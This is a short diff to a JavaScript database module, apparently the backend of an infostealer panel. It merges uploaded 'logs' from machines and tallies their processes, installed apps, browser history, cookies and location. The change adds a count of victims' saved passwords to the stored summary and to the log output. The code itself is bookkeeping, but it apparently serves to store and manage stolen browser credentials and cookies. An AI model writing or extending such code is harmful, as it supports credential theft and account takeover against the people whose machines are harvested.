@@ -332,10 +332,12 @@ const logsDb = {
                 historyEntries: totalHistoryEntries,
                 processes: (mergedPcData.runningProcesses || []).length,
                 installedApps: (mergedPcData.installedApps || []).length,
-                cookies: cookieCount
+                cookies: cookieCount,
+                passwords: (mergedPcData.savedPasswords || []).length
             };
             
-            console.log(`Merged log summary - cookies: ${cookieCount}, browserCookies type: ${typeof mergedPcData.browserCookies}, isArray: ${Array.isArray(mergedPcData.browserCookies)}`);
+            const passwordCount = (mergedPcData.savedPasswords || []).length;
+            console.log(`Merged log summary - cookies: ${cookieCount}, passwords: ${passwordCount}, browserCookies type: ${typeof mergedPcData.browserCookies}, isArray: ${Array.isArray(mergedPcData.browserCookies)}`);
             
             // Extract country from merged location data if available (even if top-level country is "Unknown")
             // This ensures that when location data arrives in a later chunk, we update the country correctly
@@ -385,7 +387,7 @@ const logsDb = {
             
             db.prepare(updateQuery).run(...updateParams);
             
-            console.log(`Updated log ${existingLog.id}: ${mergedDataSummary.processes} processes, ${mergedDataSummary.installedApps} apps, ${mergedDataSummary.historyEntries} history entries`);
+            console.log(`Updated log ${existingLog.id}: ${mergedDataSummary.processes} processes, ${mergedDataSummary.installedApps} apps, ${mergedDataSummary.historyEntries} history entries, ${mergedDataSummary.passwords || 0} passwords`);
             
             return existingLog.id;
         } else {
